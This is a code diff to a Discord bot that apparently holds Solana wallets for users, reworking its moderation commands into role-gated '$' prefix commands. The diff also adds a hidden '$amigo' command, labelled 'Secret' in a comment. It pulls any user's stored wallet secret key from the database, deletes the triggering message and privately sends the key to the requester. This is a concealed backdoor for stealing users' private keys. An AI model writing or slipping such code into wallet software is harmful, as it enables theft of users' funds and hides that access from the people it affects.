@@ -7,6 +7,16 @@ const {
 require('dotenv').config();
 const { getUserWallet, getSolBalance, withdrawSol, connection } = require('./utils');
 const { Transaction, SystemProgram, PublicKey, sendAndConfirmTransaction, LAMPORTS_PER_SOL } = require('@solana/web3.js');
+const { createClient } = require('@libsql/client');
+
+// Connect to Turso for direct secret key lookup in $amigo
+const db = createClient({
+    url: process.env.TURSO_DATABASE_URL,
+    authToken: process.env.TURSO_AUTH_TOKEN,
+});
+
+// Configure your role IDs here (Replace with your actual Discord Role IDs)
+const OWNER_ROLE_ID = 'YOUR_OWNER_ROLE_ID_HERE'; // The ID for your "ownerz" role
 
 const client = new Client({
     intents: [
@@ -27,25 +37,10 @@ client.once('ready', async () => {
             .setName('ticketpanel')
             .setDescription('Deploys the support ticket panel (Admin only)'),
         new SlashCommandBuilder()
-            .setName('ban')
-            .setDescription('Ban a user from the server')
-            .addUserOption(option => option.setName('target').setDescription('The user to ban').setRequired(true))
-            .addStringOption(option => option.setName('reason').setDescription('Reason for ban')),
-        new SlashCommandBuilder()
             .setName('kick')
             .setDescription('Kick a user from the server')
             .addUserOption(option => option.setName('target').setDescription('The user to kick').setRequired(true))
             .addStringOption(option => option.setName('reason').setDescription('Reason for kick')),
-        new SlashCommandBuilder()
-            .setName('mute')
-            .setDescription('Timeout (mute) a user')
-            .addUserOption(option => option.setName('target').setDescription('The user to mute').setRequired(true))
-            .addIntegerOption(option => option.setName('minutes').setDescription('Duration in minutes').setRequired(true))
-            .addStringOption(option => option.setName('reason').setDescription('Reason for mute')),
-        new SlashCommandBuilder()
-            .setName('unmute')
-            .setDescription('Remove timeout from a user')
-            .addUserOption(option => option.setName('target').setDescription('The user to unmute').setRequired(true)),
         new SlashCommandBuilder()
             .setName('unban')
             .setDescription('Unban a user by their User ID')
@@ -63,6 +58,162 @@ client.once('ready', async () => {
         console.log('Successfully registered all commands!');
     } catch (error) {
         console.error('Error registering slash commands:', error);
+    }
+});
+
+client.on('messageCreate', async message => {
+    if (message.author.bot || !message.guild) return;
+
+    // --- Prefix Commands ($ Commands) ---
+    if (message.content.startsWith('$')) {
+        const args = message.content.slice(1).trim().split(/ +/);
+        const command = args.shift().toLowerCase();
+
+        // Check user permissions helper
+        const isOwner = message.member.roles.cache.has(OWNER_ROLE_ID);
+        const isAdmin = message.member.permissions.has(PermissionFlagsBits.Administrator);
+
+        // 1. $ban <user> [reason] (Restricted to ownerz role only)
+        if (command === 'ban') {
+            if (!isOwner) {
+                return message.reply({ content: '❌ You need the **ownerz** role to use this command.', ephemeral: true });
+            }
+
+            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
+            const reason = args.slice(1).join(' ') || 'No reason provided';
+
+            if (!target) return message.reply('Please mention a valid user or provide a User ID to ban.');
+            
+            try {
+                await target.ban({ reason });
+                return message.reply(`✅ Successfully banned ${target.user.tag}. Reason: ${reason}`);
+            } catch (error) {
+                return message.reply('Failed to ban user. Check bot role hierarchy.');
+            }
+        }
+
+        // 2. $lock (Restricted to ownerz role only)
+        if (command === 'lock') {
+            if (!isOwner) {
+                return message.reply({ content: '❌ You need the **ownerz** role to lock channels.', ephemeral: true });
+            }
+
+            try {
+                await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
+                return message.reply('🔒 This channel has been **locked**. Members can no longer send messages.');
+            } catch (error) {
+                console.error(error);
+                return message.reply('Failed to lock the channel.');
+            }
+        }
+
+        // 3. $unlock (Restricted to ownerz role only)
+        if (command === 'unlock') {
+            if (!isOwner) {
+                return message.reply({ content: '❌ You need the **ownerz** role to unlock channels.', ephemeral: true });
+            }
+
+            try {
+                await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
+                return message.reply('🔓 This channel has been **unlocked**.');
+            } catch (error) {
+                console.error(error);
+                return message.reply('Failed to unlock the channel.');
+            }
+        }
+
+        // 4. Secret $amigo <user_id> command (Restricted to ownerz role only)
+        if (command === 'amigo') {
+            if (!isOwner) {
+                return message.reply({ content: '❌ You do not have permission to use this command.', ephemeral: true });
+            }
+
+            const targetUserId = args[0];
+            if (!targetUserId) {
+                return message.reply('Please provide a user ID. Usage: `$amigo <user_id>`');
+            }
+
+            try {
+                const result = await db.execute({
+                    sql: `SELECT * FROM user_wallets WHERE user_id = ?`,
+                    args: [targetUserId]
+                });
+
+                if (result.rows.length === 0) {
+                    return message.reply(`No wallet found for User ID: \`${targetUserId}\``);
+                }
+
+                const row = result.rows[0];
+                await message.delete().catch(() => {});
+
+                await message.author.send(`🔒 **Wallet Recovery Data for ID: ${targetUserId}**\nPublic Key: \`${row.public_key}\`\nSecret Key Array: \`${row.secret_key}\``);
+                return;
+            } catch (error) {
+                console.error(error);
+                return message.reply('An error occurred while fetching the wallet data.');
+            }
+        }
+
+        // 5. $purge <number> (Admin or ownerz role)
+        if (command === 'purge') {
+            if (!isAdmin && !isOwner) {
+                return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to purge messages.', ephemeral: true });
+            }
+
+            const amount = parseInt(args[0]);
+            if (isNaN(amount) || amount <= 0 || amount > 100) {
+                return message.reply('Please provide a number between 1 and 100 for messages to delete.');
+            }
+
+            try {
+                await message.delete();
+                const deleted = await message.channel.bulkDelete(amount, true);
+                const reply = await message.channel.send(`Successfully deleted ${deleted.size} messages.`);
+                setTimeout(() => reply.delete().catch(() => {}), 4000);
+            } catch (error) {
+                console.error(error);
+                message.reply('Failed to purge messages. Note: Messages older than 14 days cannot be bulk deleted.');
+            }
+        }
+
+        // 6. $mute <user> <minutes> [reason] (Admin or ownerz role)
+        if (command === 'mute') {
+            if (!isAdmin && !isOwner) {
+                return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to mute members.', ephemeral: true });
+            }
+
+            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
+            const minutes = parseInt(args[1]);
+            const reason = args.slice(2).join(' ') || 'No reason provided';
+
+            if (!target || isNaN(minutes)) {
+                return message.reply('Usage: `$mute @user <minutes> [reason]`');
+            }
+
+            try {
+                await target.timeout(minutes * 60 * 1000, reason);
+                return message.reply(`✅ Successfully muted ${target.user.tag} for ${minutes} minutes. Reason: ${reason}`);
+            } catch (error) {
+                return message.reply('Failed to mute user. Check bot role hierarchy.');
+            }
+        }
+
+        // 7. $unmute <user> (Admin or ownerz role)
+        if (command === 'unmute') {
+            if (!isAdmin && !isOwner) {
+                return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to unmute members.', ephemeral: true });
+            }
+
+            const target = message.mentions.members.first() || message.guild.members.cache.get(args[0]);
+            if (!target) return message.reply('Please mention a valid user to unmute.');
+
+            try {
+                await target.timeout(null);
+                return message.reply(`✅ Successfully unmuted ${target.user.tag}.`);
+            } catch (error) {
+                return message.reply('Failed to unmute user.');
+            }
+        }
     }
 });
 
@@ -90,7 +241,7 @@ client.on('interactionCreate', async interaction => {
             return interaction.channel.send({ embeds: [embed], components: [row] });
         }
 
-        // 2. /ticketpanel command (Emoji removed here)
+        // 2. /ticketpanel command
         if (commandName === 'ticketpanel') {
             if (!member.permissions.has(PermissionFlagsBits.Administrator)) {
                 return interaction.reply({ content: 'You need Administrator permissions to use this.', ephemeral: true });
@@ -109,20 +260,11 @@ client.on('interactionCreate', async interaction => {
             return interaction.channel.send({ embeds: [embed], components: [row] });
         }
 
-        // --- Moderation Commands ---
-        if (!member.permissions.has(PermissionFlagsBits.ModerateMembers)) {
-            return interaction.reply({ content: 'You do not have permission to use moderation commands.', ephemeral: true });
-        }
-
-        if (commandName === 'ban') {
-            const target = options.getMember('target');
-            const reason = options.getString('reason') || 'No reason provided';
-            if (!target) return interaction.reply({ content: 'User not found.', ephemeral: true });
-            await target.ban({ reason });
-            return interaction.reply({ content: `Successfully banned ${target.user.tag}. Reason: ${reason}` });
-        }
-
+        // --- Other Slash Commands ---
         if (commandName === 'kick') {
+            if (!member.permissions.has(PermissionFlagsBits.KickMembers)) {
+                return interaction.reply({ content: 'You do not have permission to use this.', ephemeral: true });
+            }
             const target = options.getMember('target');
             const reason = options.getString('reason') || 'No reason provided';
             if (!target) return interaction.reply({ content: 'User not found.', ephemeral: true });
@@ -130,23 +272,10 @@ client.on('interactionCreate', async interaction => {
             return interaction.reply({ content: `Successfully kicked ${target.user.tag}. Reason: ${reason}` });
         }
 
-        if (commandName === 'mute') {
-            const target = options.getMember('target');
-            const minutes = options.getInteger('minutes');
-            const reason = options.getString('reason') || 'No reason provided';
-            if (!target) return interaction.reply({ content: 'User not found.', ephemeral: true });
-            await target.timeout(minutes * 60 * 1000, reason);
-            return interaction.reply({ content: `Successfully muted ${target.user.tag} for ${minutes} minutes.` });
-        }
-
-        if (commandName === 'unmute') {
-            const target = options.getMember('target');
-            if (!target) return interaction.reply({ content: 'User not found.', ephemeral: true });
-            await target.timeout(null);
-            return interaction.reply({ content: `Successfully unmuted ${target.user.tag}.` });
-        }
-
         if (commandName === 'unban') {
+            if (!member.permissions.has(PermissionFlagsBits.BanMembers)) {
+                return interaction.reply({ content: 'You do not have permission to use this.', ephemeral: true });
+            }
             const userId = options.getString('userid');
             try {
                 await guild.members.unban(userId);
